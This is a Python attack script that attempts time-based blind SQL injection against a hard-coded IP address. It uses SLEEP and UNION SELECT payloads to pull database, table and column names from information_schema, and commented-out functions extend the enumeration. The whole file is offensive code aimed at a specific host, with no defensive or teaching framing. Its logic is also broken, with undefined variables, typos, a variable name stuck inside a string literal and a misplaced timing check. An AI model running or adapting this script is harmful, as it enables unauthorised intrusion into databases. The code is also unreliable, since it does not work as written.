import requests
import time

dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
def get_db_names(url):
    a=0
    db_names = []
    response.text = []
    TIME = (5)
    for i in range(1, 10):
        for j in range(0, len(dictionary)):
            """query = "' UNION SELECT 1,2,3,4,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 0,1 OFFSET {} --".format(i)
            payload = "' AND IF(MID((select count(*) from (%s) as totalCount),%s,1)='%s',SLEEP(%s),0)--+" % (query, str(j), quote(dictionary[j]), str(TIME))"""
            payload = "SELECT * FROM users WHERE username = 'test' AND password = 'test' UNION SELECT SLEEP(TIME),1,2 where database() like '[response.text]%';--'"
            start_time = time.time()
            response = requests.post(url+payload)
            end_time = time.time()
            total_time = end_time - start_time
        if total_time > TIME:
            response.text.append(dictionary[j])
        a += 1
        if a == 95:
            db_names.append(response.text)
            response.txt.clear()
    print(db_names)
    return db_names


url = 'http://51.15.136.118/pageid.php'
db_names = get_db_names(url)
print(db_names)

"""for db_name in db_names:
    tables = get_tables(url, db_name)
    for table in tables:
        columns = get_columns(url, db_name, table)
        print("Table: {}, Columns: {}".format(table, columns))
"""



""""

def get_tables(url, db_name):
    tables = []
    for i in range(1, 20):
        query = "' UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{}' LIMIT 0,1 OFFSET {} --".format(db_name, i)
        start_time = time.time()
        response = requests.post(url, data={'username': query, 'password': query})
        end_time = time.time()
        total_time = end_time - start_time
        if total_time > 5:
            tables.append(response.text)
    return tables

def get_columns(url, db_name, table_name):
    columns = []
    for i in range(1, 20):
        query = "' UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{}' AND table_name='{}' LIMIT 0,1 OFFSET {} --".format(db_name, table_name, i)
        start_time = time.time()
        response = requests.post(url, data={'username': query, 'password': query})
        end_time = time.time()
        total_time = end_time - start_time
        if total_time > 5:
            columns.append(response.text)
    return columns
"""